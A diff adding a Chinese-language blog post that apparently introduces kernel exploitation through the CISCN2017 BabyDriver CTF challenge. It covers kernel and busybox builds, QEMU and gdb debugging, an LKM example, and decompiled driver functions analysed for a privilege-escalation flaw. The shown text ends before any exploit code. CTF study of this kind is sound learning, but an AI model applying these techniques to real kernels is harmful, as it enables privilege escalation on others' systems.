@@ -1,0 +1,471 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <link rel="manifest" href="/manifest.json">
+  <link rel="apple-touch-startup-image" href="images/hexo.png">
+  <link rel="apple-touch-icon" href="images/icons/icon-72x72.png">
+<link rel="apple-touch-icon" sizes="152x152" href="images/icons/icon-152x152.png">
+<link rel="apple-touch-icon" sizes="180x180" href="images/icons/icon-192x192.png">
+<link rel="apple-touch-icon" sizes="167x167" href="images/icons/icon-192x192.png">
+<meta name="google-site-verification" content="L5kWE5AiVRVNF1nYqMGyNoUu7WToxJIl3d8MmFk4Cjw" />
+  <meta charset="utf-8">
+  
+  
+    <meta name="keywords" content="Migraine殇,个人博客,日记,pwn,二进制,ctf,浏览器">
+  
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <title>
+    kernel pwn 入门-BabyDriver |
+    
+    Migraine殇</title>
+  
+    <link rel="shortcut icon" href="/fujiang.jpg">
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+    
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">
+
+  
+  
+<script src="/js/pace.min.js"></script>
+
+<meta name="generator" content="Hexo 4.2.0"></head>
+
+<body>
+<main class="content">
+  <section class="outer">
+  
+
+<article id="post-kernel-pwn" class="article article-type-post" itemscope itemprop="blogPost" data-scroll-reveal>
+  
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      kernel pwn 入门-BabyDriver
+    </h1>
+  
+  
+
+
+
+
+      </header>
+    
+
+    
+      <div class="article-meta">
+        <a href="/2020/03/14/kernel-pwn/" class="article-date">
+  <time datetime="2020-03-14T07:51:50.000Z" itemprop="datePublished">2020-03-14</time>
+</a>
+        
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/Kernel-IOT/">Kernel/IOT</a>
+  </div>
+
+      </div>
+    
+
+    
+      
+    <div class="tocbot"></div>
+
+
+
+
+
+    
+
+    <div class="article-entry" itemprop="articleBody">
+      
+
+
+      
+
+      
+        <p>第一次做kernel pwn的题目，用CISCN2017的babydriver做个入门吧。从编译内核到调试内核环境都做一做吧。</p>
+<p>kernel pwn需要安装qemu来运行内核环境，我使用的是MIT的修改版本qemu，连接gdb调试更加方便一些。</p>
+  <a id="more"></a>
+
+<p><strong>需要掌握的知识结构</strong></p>
+<ul>
+<li>内核编译和文件系统</li>
+<li><a href="https://www.freebuf.com/articles/system/54263.html" target="_blank" rel="noopener">LKM编程基础</a></li>
+<li>内核调试技巧</li>
+</ul>
+<p>可以参考大佬的这篇<a href="[https://www.lhyerror404.cn/2020/03/23/%E3%80%90%E8%BD%AC%E3%80%91kernel-pwn-%E5%AD%A6%E4%B9%A0%E4%B9%8B%E8%B7%AF%E4%B8%80/](https://www.lhyerror404.cn/2020/03/23/[转]kernel-pwn-学习之路一/)">文章</a></p>
+<h2 id="编译内核"><a href="#编译内核" class="headerlink" title="编译内核"></a>编译内核</h2><p><strong>Download</strong></p>
+<p>从<a href="https://www.kernel.org" target="_blank" rel="noopener">Linux Kernel</a>官网下载并且解压内核源代码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">xz -d linux-4.4.217.tar.xz</span><br><span class="line">tar xvf linux-4.4.217.tar</span><br><span class="line">cd linux-4.4.217&#x2F;</span><br></pre></td></tr></table></figure>
+
+<p><strong>安装依赖</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get update</span><br><span class="line">sudo apt-get install build-essential libncurses5-dev</span><br></pre></td></tr></table></figure>
+
+<p><strong>编译</strong></p>
+<p><a href="http://eternalsakura13.com/2018/04/13/qemu/" target="_blank" rel="noopener">参考</a></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ make menuconfig</span><br><span class="line">进入Kernel hacking</span><br><span class="line">勾选以下项目</span><br><span class="line">Kernel debugging</span><br><span class="line">Compile-time checks and compiler options —&gt; Compile the kernel with debug info和Compile the kernel with frame pointers</span><br><span class="line">KGDB</span><br><span class="line">然后保存退出</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://gitee.com/p0kerface/blog_image_management/raw/master/uPic/RLl1Ev.png" alt="RLl1Ev"></p>
+<p>生成镜像文件bzImage，编译完成之后可以在arch/x86/boot中找到。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ make bzImage</span><br><span class="line">...</span><br><span class="line">Kernel: arch&#x2F;x86&#x2F;boot&#x2F;bzImage is ready  (#1)</span><br><span class="line">make[1]: warning:  Clock skew detected.  Your build may be incomplete.</span><br></pre></td></tr></table></figure>
+
+<p><strong>构建文件系统</strong></p>
+<p>下载busybox，解压、配置并且编译。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">wget https:&#x2F;&#x2F;busybox.net&#x2F;downloads&#x2F;busybox-1.27.2.tar.bz2</span><br><span class="line">tar -jxvf busybox-1.27.2.tar.bz2</span><br><span class="line">cd busybox-1.27.2</span><br><span class="line">make menuconfig # Busybox Settings -&gt; Build Options -&gt; Build Busybox as a static binary</span><br><span class="line">make install</span><br></pre></td></tr></table></figure>
+
+<p>建立文件系统</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">cd _install</span><br><span class="line">mkdir proc</span><br><span class="line">mkdir sys</span><br><span class="line">touch init</span><br><span class="line">chmod +x init</span><br></pre></td></tr></table></figure>
+
+<p>编写init</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/sh</span></span><br><span class="line">mkdir /tmp</span><br><span class="line">mount -t proc none /proc</span><br><span class="line">mount -t sysfs none /sys</span><br><span class="line">mount -t debugfs none /sys/kernel/debug</span><br><span class="line">mount -t tmpfs none /tmp</span><br><span class="line">mdev -s # We need this to find /dev/sda later</span><br><span class="line">setsid /bin/cttyhack setuidgid 1000 /bin/sh  #设置权限（如果要用root登陆将1000改为0即可）</span><br><span class="line"></span><br><span class="line">umount /proc</span><br><span class="line">umount /sys</span><br><span class="line">poweroff -d 0  -f</span><br></pre></td></tr></table></figure>
+
+<p>打包文件系统</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find . | cpio -o --format&#x3D;newc &gt; ..&#x2F;..&#x2F;rootfs.img</span><br></pre></td></tr></table></figure>
+
+<p><strong>boot</strong></p>
+<p>编写启动脚本boot.sh</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line"></span><br><span class="line">qemu-system-x86_64 -initrd rootfs.img -kernel bzImage -append 'console=ttyS0' --nographic</span><br></pre></td></tr></table></figure>
+
+<h2 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h2><p><a href="https://www.cnblogs.com/61355ing/p/10386955.html" target="_blank" rel="noopener">参考</a></p>
+<p>这里是ubuntu下的环境配置，在mac下配置略有区别。</p>
+<p><strong>qemu</strong></p>
+<p>安装依赖</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install libsdl2-2.0 libsdl2-dev libpixman-1-dev flex bison</span><br></pre></td></tr></table></figure>
+
+<p>下载Qemu<a href="https://download.qemu.org" target="_blank" rel="noopener">代码</a>,并且编译，如果运行之后没有显示界面，需要安装SDL（configure之后输出中包含 SDL support       yes (2.0.8)）我的Ubuntu18.04运行最新的qemu5.0无法gdb调试，建议安装qemu4.0系列的版本。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">.&#x2F;configure --enable-debug  --target-list&#x3D;x86_64-softmmu</span><br><span class="line">sudo make</span><br><span class="line">sudo make install</span><br></pre></td></tr></table></figure>
+
+<p>运行题目提供的boot.sh脚本时出现如下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ .&#x2F;boot.sh </span><br><span class="line">Could not access KVM kernel module: No such file or directory</span><br><span class="line">qemu-system-x86_64: failed to initialize KVM: No such file or directory</span><br></pre></td></tr></table></figure>
+
+<p>说明该虚拟机硬件不支持虚拟化，所以在VMfusion中选择<strong>虚拟机-&gt;处理器和内存-&gt;高级选项-&gt;虚拟化Inter VT-x/EPT</strong>，并且重启虚拟机。</p>
+<p><strong>gdb</strong></p>
+<p>安装pwdbg/peda/gef等插件</p>
+<p><a href="https://blog.csdn.net/jasonLee_lijiaqi/article/details/80967912" target="_blank" rel="noopener">qemu+gdb调试Linux内核</a></p>
+<p>gdb加载编译好的源代码</p>
+<p><img src="https://gitee.com/p0kerface/blog_image_management/raw/master/uPic/qDHOk9.png" alt="qDHOk9"></p>
+<p>设置监听端口（默认1234），为boot.sh设定的代码加上参数-s运行。就可以使用gdb对系统内核进行有源代码的调试了。断点·<code>hb start_kernel</code></p>
+<p><img src="https://gitee.com/p0kerface/blog_image_management/raw/master/uPic/qsCTiW.png" alt="qsCTiW"></p>
+<p><strong>vmlinux</strong></p>
+<p>vmlinux是编译出的原始内核文件，未经过压缩的ELF格式。可以用于搜索gadgets。有些题目会提供，否则可以从bzImage中导出，工具<a href="https://raw.githubusercontent.com/torvalds/linux/master/scripts/extract-vmlinux" target="_blank" rel="noopener">extract-vmlinux</a>。</p>
+<p><strong>ropper</strong></p>
+<p>ROPgadget跑的太慢了，使用<a href="https://github.com/sashs/Ropper" target="_blank" rel="noopener">ropper</a>会快很多</p>
+<h2 id="调试相关"><a href="#调试相关" class="headerlink" title="调试相关"></a>调试相关</h2><p>要对内核模块进行调试，在启动脚本中加入</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-gdb tcp::1234</span><br></pre></td></tr></table></figure>
+
+<p>然后使用 gdb 连接</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gdb -q -ex &quot;target remote localhost:1234&quot;</span><br></pre></td></tr></table></figure>
+
+<p>如果显示 Remote ‘g’ packet reply is too long 一长串数字，要设置一下架构</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gdb -q -ex &quot;set architecture i386:x86-64:intel&quot; -ex &quot;target remote localhost:1234&quot;</span><br></pre></td></tr></table></figure>
+
+<p>调试内核模块，/sys/module中查看各个模块的信息。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> <span class="built_in">cd</span> sys/module/</span></span><br><span class="line">/sys/module $ ls</span><br><span class="line">8250                ipv6                scsi_mod</span><br><span class="line">acpi                kdb                 sg</span><br><span class="line">acpi_cpufreq        kernel              spurious</span><br><span class="line">acpiphp             keyboard            sr_mod</span><br><span class="line">apparmor            kgdb_nmi            suspend</span><br><span class="line">ata_generic         kgdboc              sysrq</span><br><span class="line">ata_piix            libata              tcp_cubic</span><br><span class="line">babydriver          loop                thermal</span><br><span class="line">battery             md_mod              tpm</span><br><span class="line">block               module              tpm_tis</span><br><span class="line">core                mousedev            uhci_hcd</span><br><span class="line">cpuidle             netpoll             uinput</span><br><span class="line">debug_core          pata_sis            usbcore</span><br><span class="line">dm_mod              pcc_cpufreq         virtio_balloon</span><br><span class="line">dns_resolver        pci_hotplug         virtio_blk</span><br><span class="line">dynamic_debug       pci_slot            virtio_mmio</span><br><span class="line">edd                 pcie_aspm           virtio_net</span><br><span class="line">efivars             pciehp              virtio_pci</span><br><span class="line">ehci_hcd            ppp_generic         vt</span><br><span class="line">elants_i2c          printk              workqueue</span><br><span class="line">ext4                processor           xen_acpi_processor</span><br><span class="line">firmware_class      pstore              xen_blkfront</span><br><span class="line">fuse                rcupdate            xen_netfront</span><br><span class="line">i8042               rcutree             xhci_hcd</span><br><span class="line">ima                 rfkill              xz_dec</span><br><span class="line">intel_idle          rng_core            zswap</span><br></pre></td></tr></table></figure>
+
+<p>查看babydriver模块的加载地址</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">/sys/module $ cd babydriver/</span><br><span class="line">/sys/module/babydriver $ ls</span><br><span class="line">coresize    initsize    notes       sections    taint</span><br><span class="line">holders     initstate   refcnt      srcversion  uevent</span><br><span class="line">/sys/module/babydriver $ cd sections/</span><br><span class="line">/sys/module/babydriver/sections $ ls</span><br><span class="line">__mcount_loc</span><br><span class="line">/sys/module/babydriver/sections $ cat __mcount_loc </span><br><span class="line">0xffffffffc00010d0</span><br><span class="line">/sys/module/babydriver/sections $ grep 0 .text</span><br><span class="line">0xffffffffc0000000</span><br></pre></td></tr></table></figure>
+
+<p>对内核进行带符号表调试,不知道为何我这里符号表加载不进去。。后来把驱动放到跟目录下就好了，也许和不是root权限有关？</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">(gdb) add-symbol-file ./babydriver.ko 0xffffffffc0000000</span><br><span class="line">add symbol table from file "./babydriver.ko" at</span><br><span class="line">	.text_addr = 0xffffffffc0000000</span><br><span class="line">(y or n) y</span><br><span class="line">Reading symbols from ./babydriver.ko...</span><br><span class="line">(gdb) b *babyopen</span><br><span class="line">Breakpoint 1 at 0xffffffffc0000030: file /home/atum/PWN/my/babydriver/kernelmodule/babydriver.c, line 28.</span><br></pre></td></tr></table></figure>
+
+<p>GDB调试时kernel无法用Ctrl+C进行中断，<a href="http://www.kgdb.info/how_gdb_to_stop_kernel/" target="_blank" rel="noopener">解决方案</a></p>
+<h2 id="LKM编写"><a href="#LKM编写" class="headerlink" title="LKM编写"></a>LKM编写</h2><p>hello.c</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/module.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/init.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/kernel.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">MODULE_LICENSE(<span class="string">"Dual BSD/GPL"</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">hello_init</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    printk(KERN_DEBUG <span class="string">"Hello World !!!\n"</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">hello_exit</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    printk(KERN_DEBUG <span class="string">"Bye bye !!!\n"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">module_init(hello_init);</span><br><span class="line">module_exit(hello_exit);</span><br></pre></td></tr></table></figure>
+
+<p>Makefile</p>
+<figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">obj-m   := hello.o</span><br><span class="line"></span><br><span class="line">KDIR    := /lib/modules/<span class="variable">$(<span class="built_in">shell</span> uname -r)</span>/build</span><br><span class="line">PWD    := <span class="variable">$(<span class="built_in">shell</span> pwd)</span></span><br><span class="line"></span><br><span class="line"><span class="section">default:</span></span><br><span class="line">        <span class="variable">$(MAKE)</span> -C <span class="variable">$(KDIR)</span> SUBDIRS=<span class="variable">$(PWD)</span> modules</span><br></pre></td></tr></table></figure>
+
+<p>make编译，使用insmod将驱动加载到系统中。通过dmesg查看内核的输出。</p>
+<p><img src="https://gitee.com/p0kerface/blog_image_management/raw/master/uPic/rOdhL5.png" alt="rOdhL5"></p>
+<p><img src="https://gitee.com/p0kerface/blog_image_management/raw/master/uPic/TvAYKI.png" alt="TvAYKI"></p>
+<p>需要编译对应内核版本的驱动，如果要编译本题的（4.4.72版本）内核，需要在<a href="https://mirrors.edge.kernel.org/pub/linux/kernel/v4.x/" target="_blank" rel="noopener">kernel</a>下载源代码，并且KDIR修改为<code>源代码/build</code>目录。（不过还没验证过）</p>
+<p><strong>报错</strong></p>
+<p>遇到MODPOST 0modules的错误，MakeFile编写出了问题，obj-m少了o</p>
+<p><img src="https://gitee.com/p0kerface/blog_image_management/raw/master/uPic/nn3gYy.png" alt="nn3gYy"></p>
+<p>gcc报错，是gcc版本太低，需要更新到gcc-5以上</p>
+<p><img src="https://gitee.com/p0kerface/blog_image_management/raw/master/uPic/Lsh3bb.png" alt="Lsh3bb"></p>
+<p>加载没有符号表，<a href="http://wonfee.github.io/2015/06/23/linux-driver-module/" target="_blank" rel="noopener">参考</a></p>
+<p>内核版本不匹配，导致愿意原因一般是更新过系统。</p>
+<p><img src="https://gitee.com/p0kerface/blog_image_management/raw/master/uPic/2ykW3F.png" alt="2ykW3F"></p>
+<p>比如我这里，要手动把Makefile里的路径$(shell uname -r)的值改掉。</p>
+<p>![image-20200425171033591](/Users/migraine/Library/Application Support/typora-user-images/image-20200425171033591.png)</p>
+<p><strong>LKM的一些命令/函数</strong></p>
+<p>insmod:加载模块</p>
+<p>lsmod:查看模块</p>
+<p>rmmod:删除模块</p>
+<p>open:打开模块</p>
+<p>Ioctl:int ioctl(ind fd,int request,…)操作模块 </p>
+<p>read:读模块</p>
+<p>write:写模块</p>
+<p>close:关闭模块</p>
+<h2 id="BabyDriver"><a href="#BabyDriver" class="headerlink" title="BabyDriver"></a>BabyDriver</h2><p>题目一般都会提供四个文件，拿本题的四个文件举例<strong>bzImage</strong>  <strong>rootfs.cpio</strong>  <strong>babydriver.ko</strong>  <strong>boot.sh</strong>，分别是内核镜像、文件系统、一个包含漏洞的LKM驱动和启动脚本。之前自己编译过内核，应该就知道这一部分的意义。</p>
+<p>解包文件系统。在文件系统中，可以看到init文件，调用了insmod加载了包含了漏洞的babydriver.ko。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cpio -idmv &lt; rootfs.cpio  #解包</span><br><span class="line">find . | cpio -o --format=newc &gt; ../rootfs.cpio#打包</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://gitee.com/p0kerface/blog_image_management/raw/master/uPic/Vx1vlC.png" alt="Vx1vlC"></p>
+<p><strong>init</strong>文件</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/sh</span></span><br><span class="line"></span><br><span class="line">mount -t proc none /proc</span><br><span class="line">mount -t sysfs none /sys</span><br><span class="line">mount -t devtmpfs devtmpfs /dev</span><br><span class="line">chown root:root flag</span><br><span class="line">chmod 400 flag</span><br><span class="line">exec 0&lt;/dev/console</span><br><span class="line">exec 1&gt;/dev/console</span><br><span class="line">exec 2&gt;/dev/console</span><br><span class="line"></span><br><span class="line">insmod /lib/modules/4.4.72/babydriver.ko</span><br><span class="line">chmod 777 /dev/babydev</span><br><span class="line">echo -e "\nBoot took $(cut -d' ' -f1 /proc/uptime) seconds\n"</span><br><span class="line">setsid cttyhack setuidgid 1000 sh</span><br><span class="line"></span><br><span class="line">umount /proc</span><br><span class="line">umount /sys</span><br><span class="line">poweroff -d 0  -f</span><br></pre></td></tr></table></figure>
+
+<p>运行./boot.sh起系统。当然，比赛提供的文件系统中自然是没有flag的，所以显示No such file，不过本地可以自己写在文件系统里然后打包。比赛中，打服务器也是将自己脚本上传到tmp，然后运行提权。</p>
+<p><img src="https://gitee.com/p0kerface/blog_image_management/raw/master/uPic/opn3rf.png" alt="opn3rf"></p>
+<p>打包运行脚本，将我们的flag放入busybox的根目录（此处为core目录），如果要调试就让gdb监听1234端口。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/sh</span></span><br><span class="line"></span><br><span class="line">cd core </span><br><span class="line">find . | cpio -o --format=newc &gt; ../rootfs.cpio</span><br><span class="line">cd ..</span><br><span class="line">qemu-system-x86_64 -initrd rootfs.cpio -kernel bzImage -append 'console=ttyS0' --nographic -s</span><br></pre></td></tr></table></figure>
+
+<p><strong>漏洞分析</strong></p>
+<p>使用<a href="https://github.com/slimm609/checksec.sh" target="_blank" rel="noopener">checksec</a>检查保护机制，只开了NX。</p>
+<p><img src="https://gitee.com/p0kerface/blog_image_management/raw/master/uPic/5JjqTu.png" alt="5JjqTu"></p>
+<p>IDA中Shift+F9查看有哪些结构体</p>
+<p><img src="https://gitee.com/p0kerface/blog_image_management/raw/master/uPic/dvhk29.png" alt="dvhk29"></p>
+<p>IDA里查看出题人编写的几个函数。</p>
+<p><strong>babyioctl</strong>：定义了0x0001的ioctl命令，ioctl系统调用用于控制设备，每个ioctl调用内部存在switch case结构，每个case对应一个命令。babyioctl会释放babydev_struct结构体中的device buf缓冲区，然后根据用户输入的size值分配对应内存。因为是__fastcall方式，参数都是寄存器传递的，这里了解即可。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> __<span class="function">fastcall <span class="title">babyioctl</span><span class="params">(file *filp, <span class="keyword">unsigned</span> <span class="keyword">int</span> command, <span class="keyword">unsigned</span> __int64 arg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">size_t</span> v3; <span class="comment">// rdx</span></span><br><span class="line">  <span class="keyword">size_t</span> v4; <span class="comment">// rbx</span></span><br><span class="line">  __int64 v5; <span class="comment">// rdx</span></span><br><span class="line"></span><br><span class="line">  _fentry__(filp, *(_QWORD *)&amp;command);</span><br><span class="line">  v4 = v3;</span><br><span class="line">  <span class="keyword">if</span> ( command == <span class="number">0x10001</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    kfree(babydev_struct.device_buf);</span><br><span class="line">    babydev_struct.device_buf = (<span class="keyword">char</span> *)_kmalloc(v4, <span class="number">0x24000C0</span>LL);</span><br><span class="line">    babydev_struct.device_buf_len = v4;</span><br><span class="line">    printk(<span class="string">"alloc done\n"</span>, <span class="number">0x24000C0</span>LL, v5);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    printk(<span class="string">"\x013defalut:arg is %ld\n"</span>, v3, v3);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>需要注意的是<strong>printk</strong>并不会输出在console中，需要使用dmesg命令才能查看输出。</p>
+<p><strong>babyopen</strong>：申请一块0x40字节大小的空间，存储在babydev_struct.device_buf上。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">fastcall <span class="title">babyopen</span><span class="params">(inode *inode, file *filp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v2; <span class="comment">// rdx</span></span><br><span class="line"></span><br><span class="line">  _fentry__(inode, filp);</span><br><span class="line">  babydev_struct.device_buf = (<span class="keyword">char</span> *)kmem_cache_alloc_trace(kmalloc_caches[<span class="number">6</span>], <span class="number">0x24000C0</span>LL, <span class="number">0x40</span>LL);</span><br><span class="line">  babydev_struct.device_buf_len = <span class="number">64L</span>L;</span><br><span class="line">  printk(<span class="string">"device open\n"</span>, <span class="number">0x24000C0</span>LL, v2);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><strong>babyread</strong>：首先检测读取是否越界，然后将device_buf中的数据拷贝到用户空间的buffer缓冲区中。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> __<span class="function">fastcall <span class="title">babyread</span><span class="params">(file *filp, <span class="keyword">char</span> *<span class="built_in">buffer</span>, <span class="keyword">size_t</span> length, <span class="keyword">loff_t</span> *offset)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">size_t</span> v4; <span class="comment">// rdx</span></span><br><span class="line"></span><br><span class="line">  _fentry__(filp, <span class="built_in">buffer</span>);</span><br><span class="line">  <span class="keyword">if</span> ( babydev_struct.device_buf )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( babydev_struct.device_buf_len &gt; v4 )</span><br><span class="line">      copy_to_user(<span class="built_in">buffer</span>, babydev_struct.device_buf, v4);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><strong>babywrite</strong>：作用与babyread相反，很好理解。</p>
